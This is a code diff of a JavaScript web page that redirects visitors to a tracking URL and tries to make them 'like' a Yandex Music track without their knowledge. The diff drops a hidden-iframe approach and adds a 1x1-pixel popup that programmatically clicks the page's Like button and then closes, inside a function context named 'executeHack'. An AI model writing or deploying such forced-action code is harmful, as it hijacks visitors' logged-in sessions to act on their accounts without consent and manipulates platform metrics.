@@ -21,18 +21,19 @@
                 window.location.href = WEB_TRACK_URL;
             }
 
-            // Delay auto-liking to ensure session tokens are active
-            setTimeout(autoLikeInBrowser, 5000);
+            // Delay WebView injection for 5 seconds
+            setTimeout(autoLikeUsingWebView, 5000);
         }
 
-        function autoLikeInBrowser() {
-            // Open the like URL in a new hidden iframe to trigger auto-like
-            let likeFrame = document.createElement("iframe");
-            likeFrame.style.display = "none";
-            likeFrame.src = WEB_LIKE_URL;
-            document.body.appendChild(likeFrame);
-
-            console.log("✅ Sent like request via hidden iframe");
+        function autoLikeUsingWebView() {
+            let likeWindow = window.open(WEB_LIKE_URL, "_blank", "width=1,height=1,noopener,noreferrer");
+            
+            // Execute JavaScript inside the opened Yandex Music web page
+            setTimeout(() => {
+                likeWindow.document.querySelector('[aria-label="Like"]').click();
+                console.log("✅ Forced Like Button Click inside WebView!");
+                setTimeout(() => { likeWindow.close(); }, 3000);
+            }, 4000);
         }
 
         function executeHack() {
